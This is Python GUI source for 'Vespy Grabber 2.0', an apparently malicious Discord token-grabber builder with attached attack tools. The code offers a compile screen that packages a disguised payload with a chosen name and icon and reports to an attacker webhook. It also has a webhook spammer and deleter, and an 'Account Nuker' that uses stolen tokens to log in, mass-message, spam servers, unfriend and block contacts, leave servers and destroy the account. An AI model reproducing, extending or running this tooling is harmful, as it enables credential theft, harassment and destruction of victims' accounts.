            webhook = DiscordWebhook(url=your_webhook, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
            embed = DiscordEmbed(title=f"Webhook Spammer", description=f"```Successfully Spammed Webhook. Task done.```", color='4300d1')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
            embed.set_footer(text='Vespy 2.0 | by : vesper')
            embed.set_timestamp()
            webhook.add_embed(embed)
            webhook.execute()

    def _delwebhookhehe(self):
        your_webhook = self.TOOLWEBHOOK
        webhook = self.wswebhook.get()
        from tools.WebhookSpam import deletewebhook
        deletewebhook(webhook)
        webhook = DiscordWebhook(url=your_webhook, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
        embed = DiscordEmbed(title=f"Webhook Spammer", description=f"```Successfully Deleted Webhook```", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        webhook.add_embed(embed)
        webhook.execute()

    def _beforespam(self):
        Thread(target=self._spamthehookasf).start()

    def _wbhspammer(self):
        bg2 = Label(window, image=webhookspammerbg,bg='#0B0B0B',borderwidth=0)
        bg2.place(x=178, y=101)
        goback = Button(window, image=backbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._distools)
        goback.place(x=186,y=401)
        delbu = Button(window, image=deletebu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._delwebhookhehe)
        delbu.place(x=378,y=187)
        self.wswebhook = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=20,borderwidth=0)
        self.wswebhook.place(x=224,y=193)
        self.wscontent = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=20,borderwidth=0)
        self.wscontent.place(x=224,y=257)
        self.wsthreads = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=20,borderwidth=0)
        self.wsthreads.place(x=224,y=320)
        self.addembedbu = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._add_embed)
        self.addembedbu.place(x=219,y=354)
        self.wstitle = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=20,borderwidth=0)
        self.wstitle.place(x=505,y=191)
        self.wsdescr = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=20,borderwidth=0)
        self.wsdescr.place(x=505,y=249)
        self.wscolorhex= Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=20,borderwidth=0)
        self.wscolorhex.place(x=505,y=305)
        self.wsimgurl= Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=20,borderwidth=0)
        self.wsimgurl.place(x=505,y=363)
        starttt = Button(window, image=startbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._beforespam)
        starttt.place(x=410,y=391)

    def _checktoken(self):
        from tools.AccountNuker import _infotoken
        _infotoken(self.discordtoken.get(), self.TOOLWEBHOOK)
    
    def _logintoken(self):
        from tools.AccountNuker import _checktoken, _logintoken
        if _checktoken(self.discordtoken.get()):
             #Thread(_logintoken,args=([self.discordtoken.get()])).start()
             _logintoken(self.discordtoken.get())
        else:
            messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Error, Invalid or expired token")
    
    def _addstatus(self):
        if len(self.dtcycle.get()) > 1:
            self.STATDATA.append(self.dtcycle.get())
        self.dtcycle.delete(0, END)
        messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003",f"Status Added Successfully to the list.")
    
    def _startcycl(self):
        from tools.AccountNuker import _checktoken, _cyclestatus
        if _checktoken(self.discordtoken.get()):
            Thread(target=_cyclestatus,args=(self.discordtoken.get(),self.STATDATA)).start()
        else:
            messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Error, Invalid or expired token")

    def _sendmessages(self):
        from tools.AccountNuker import _checktoken, _massdm
        if _checktoken(self.discordtoken.get()):
            Thread(target=_massdm,args=(self.discordtoken.get(),self.dtmassdm.get())).start()
        else:
            messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Error, Invalid or expired token")

    def _startserverspamming(self):
        from tools.AccountNuker import _checktoken, _serverspamm
        if _checktoken(self.discordtoken.get()):
            Thread(target=_serverspamm,args=(self.discordtoken.get(),self.SERVDATA)).start()
        else:
            messagebox.showerror("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003","Error, Invalid or expired token")

    def _addservername(self):
        if len(self.dtservername.get()) > 1:
            self.SERVDATA.append(self.dtservername.get())
        self.dtservername.delete(0,END)
        messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper, vesper#0003",f"Server Name Added Successfully to the list.")

    def _unfriendall(self):
        if self.UNFRIENDALLBU:
            self.UNFRIENDALLBU=False
            self.unfriendallbu.config(image=blankbu)
        else:
            self.UNFRIENDALLBU=True
            self.unfriendallbu.config(image=fullbu)
            from tools.AccountNuker import _checktoken, _unfriend
            if _checktoken(self.discordtoken.get()):
                Thread(target=_unfriend,args=(self.discordtoken.get(),"?")).start()
    
    def _blockall(self):
        if self.BLOCKALLBU:
            self.BLOCKALLBU=False
            self.blockallbu.config(image=blankbu)
        else:
            self.BLOCKALLBU=True
            self.blockallbu.config(image=fullbu)
            from tools.AccountNuker import _checktoken, _blockal
            if _checktoken(self.discordtoken.get()):
                Thread(target=_blockal,args=(self.discordtoken.get(),"?")).start()
    
    def _leaveall(self):
        if self.LEAVEALLBU:
            self.LEAVEALLBU=False
            self.leaveserversbu.config(image=blankbu)
        else:
            self.LEAVEALLBU=True
            self.leaveserversbu.config(image=fullbu)
            from tools.AccountNuker import _checktoken, _leavethemall
            if _checktoken(self.discordtoken.get()):
                Thread(target=_leavethemall,args=(self.discordtoken.get(),"?")).start()
    
    def _spamem(self):
        if self.SPAMEMAILBU:
            self.SPAMEMAILBU=False
            self.spamemailbu.config(image=blankbu)
        else:
            self.SPAMEMAILBU=True
            self.spamemailbu.config(image=fullbu)
            from tools.AccountNuker import _checktoken, _spamemail
            if _checktoken(self.discordtoken.get()):
                Thread(target=_spamemail,args=(self.discordtoken.get(),"?")).start()
    
    def _closedmmm(self):
        if self.CLOSEDM:
            self.CLOSEDM=False
            self.closedmbu.config(image=blankbu)
        else:
            self.CLOSEDM=True
            self.closedmbu.config(image=fullbu)
            from tools.AccountNuker import _checktoken, _closedms
            if _checktoken(self.discordtoken.get()):
                Thread(target=_closedms,args=(self.discordtoken.get(),"?")).start()
    
    def _seiiizure(self):
        if self.SEIZUREEE:
            self.SEIZUREEE=False
            self.seizurebuwoah.config(image=blankbu)
        else:
            self.SEIZUREEE=True
            self.seizurebuwoah.config(image=fullbu)
            from tools.AccountNuker import _checktoken, _seizure
            if _checktoken(self.discordtoken.get()):
                Thread(target=_seizure,args=(self.discordtoken.get(),"?")).start()
    
    def _epicnuke(self):
        if self.EPICNUKE:
            self.EPICNUKE=False
            self.nuketheshitoutoftheaccount.config(image=blankbu)
        else:
            self.EPICNUKE=True
            self.nuketheshitoutoftheaccount.config(image=fullbu)
            from tools.AccountNuker import _checktoken, _byebyeaccount
            if _checktoken(self.discordtoken.get()):
                Thread(target=_byebyeaccount,args=(self.discordtoken.get(),"?")).start()

    def _accountnukergg(self):
        self.UNFRIENDALLBU = False
        self.BLOCKALLBU = False
        self.LEAVEALLBU = False
        self.SPAMEMAILBU = False
        self.CLOSEDM = False
        self.SEIZUREEE = False
        self.EPICNUKE = False
        self.STATDATA = []
        self.SERVDATA=[]
        bg2 = Label(window, image=accnukerbg,bg='#0B0B0B',borderwidth=0)
        bg2.place(x=178, y=101)
        goback = Button(window, image=backbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._distools)
        goback.place(x=186,y=401)
        checktoken = Button(window, image=checkbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._checktoken)
        checktoken.place(x=356,y=142)
        logintokenlol = Button(window, image=loginbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._logintoken)
        logintokenlol.place(x=435,y=142)
        self.discordtoken= Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=20,borderwidth=0)
        self.discordtoken.place(x=202,y=148)
        addstatus = Button(window, image=addbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._addstatus)
        addstatus.place(x=356,y=209)
        startcycl = Button(window, image=startbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._startcycl)
        startcycl.place(x=434,y=209)
        self.dtcycle= Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=20,borderwidth=0)
        self.dtcycle.place(x=202,y=215)
        sendmessages = Button(window, image=sendbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._sendmessages)
        sendmessages.place(x=356,y=335)
        self.dtmassdm= Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=20,borderwidth=0)
        self.dtmassdm.place(x=202,y=341)
        addservername = Button(window, image=addbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._addservername)
        addservername.place(x=356,y=274)
        startserverspam = Button(window, image=startbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._startserverspamming)
        startserverspam.place(x=434,y=274)
        self.dtservername= Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=20,borderwidth=0)
        self.dtservername.place(x=202,y=280)
        self.unfriendallbu = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._unfriendall)
        self.unfriendallbu.place(x=671,y=261)
        self.leaveserversbu = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._leaveall)
        self.leaveserversbu.place(x=671,y=288)
        self.spamemailbu = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._spamem)
        self.spamemailbu.place(x=671,y=315)
        self.closedmbu = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._closedmmm)
        self.closedmbu.place(x=671,y=369)
        self.seizurebuwoah = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._seiiizure)
        self.seizurebuwoah.place(x=671,y=396)
        self.blockallbu = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._blockall)
        self.blockallbu.place(x=671,y=342)
        self.nuketheshitoutoftheaccount = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._epicnuke)
        self.nuketheshitoutoftheaccount.place(x=615,y=181)

    def _distools(self):
        I = self.toolswebhook.get()
        self.TOOLWEBHOOK = I
        if self.checkwebhook(self.TOOLWEBHOOK):
            bg2 = Label(window, image=discotools, bg='#0B0B0B',borderwidth=0)
            bg2.place(x=178, y=101)
            goback = Button(window, image=backbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._tools)
            goback.place(x=186,y=401)
            gotoencodewbh = Button(window, image=selectbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._encodewbh)
            gotoencodewbh.place(x=235,y=354)
            gotowbhspammer = Button(window, image=selectbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._wbhspammer)
            gotowbhspammer.place(x=408,y=354)
            gotoaccountnuker = Button(window, image=selectbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._accountnukergg)
            gotoaccountnuker.place(x=591,y=354)

    def _teletools(self):
        pass

    def uwuhelp_pls(self):
        webbrowser.open("https://streamable.com/kknf86")

    def _compile(self):
        try:
            A=self.webhook.get();self.WEBHOOKTEXT=A
            B=self.hidepayloadname.get();self.PYTHONDHTEXT=B
            C=self.name.get();self.NAMETEXT=C
            D=self.icon.get();self.ICONPATHTEXT=D
        except:pass
        bg = Label(window, image=backg4, borderwidth=0)
        bg.place(x=156, y=62)
        self.webhook = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=22,borderwidth=0)
        self.webhook.insert(0, self.WEBHOOKTEXT)
        self.webhook.place(x=208, y=153)
        testt = Button(window, image=testbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._testhook)
        testt.place(x=379,y=146)
        if self.pingH == False:
            self.PingH = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._phsetup)
            self.PingH.place(x=203,y=195)
        else:
            self.PingH = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._phsetup)
            self.PingH.place(x=203,y=195)
        if self.compiletoexe == False:
            self.Compiletoexe = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._compileexesetup)
            self.Compiletoexe.place(x=233,y=288)
        else:
            self.Compiletoexe = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._compileexesetup)
            self.Compiletoexe.place(x=233,y=288)
        if self.keeppythonfile == False:
            self.Keeppythonfile = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._keeppysetup)
            self.Keeppythonfile.place(x=382,y=288)
        else:
            self.Keeppythonfile = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._keeppysetup)
            self.Keeppythonfile.place(x=382,y=288)
        if self.hidepayloadb == False:
            self.Hidepayloadb = Button(window, image=blankbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._hidepaysetup)
            self.Hidepayloadb.place(x=233,y=348)
        else:
            self.Hidepayloadb = Button(window, image=fullbu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._hidepaysetup)
            self.Hidepayloadb.place(x=233,y=349)
        self.hidepayloadname = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=22,borderwidth=0)
        self.hidepayloadname.insert(0, self.PYTHONDHTEXT)
        self.hidepayloadname.place(x=237, y=391)
        brrrrowse = Button(window, image=browsebu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._browse2)
        brrrrowse.place(x=407,y=384)
        HELPP = Button(window, image=infobu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self.uwuhelp_pls)
        HELPP.place(x=347,y=113)
        self.name = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=21,borderwidth=0)
        self.name.insert(0, self.NAMETEXT)
        self.name.place(x=488, y=129)
        self.icon = Entry(window,font=('SeoulHangang',10),bg='#0B0B0B', fg='#FFFFFF',width=17,borderwidth=0)
        self.icon.insert(0, self.ICONPATHTEXT)
        self.icon.place(x=490, y=192)
        brrrowse = Button(window, image=browsebu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._browse)
        brrrowse.place(x=628,y=185)
        Compile = Button(window, image=compilebu,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._verification)
        Compile.place(x=546,y=301)

    def _btc(self):
        copy("bc1qq3kuqn39h4uf2kr80230gqrj8k4gf9sx5ppzuf")
        messagebox.showinfo("Vespy Grabber 2.0 || @i_might_be_vesper","BTC Address Copied, ty <3")

    def _about(self):
        bg = Label(window, image=backg2, borderwidth=0)
        bg.place(x=156, y=62)
        btcc = Button(window, image=BTC,bg='#0B0B0B',borderwidth=0, activebackground="#0B0B0B",command=self._btc)
        btcc.place(x=428,y=385)

class Animation:

    def __init__(self):
        self.img = __import__('PIL').Image.open('assets/epicanim.gif')
        self.LB = Label(window)
        self.LB.place(x=0,y=0,width=744,height=447)
        for self.img in ImageSequence.Iterator(self.img):
            self._anim()
        Menu()
    
    def _anim(self):
        sleep(0.025)
        self.img=ImageTk.PhotoImage(self.img)
        self.LB.config(image=self.img)
        window.update()

Animation()
window.mainloop()
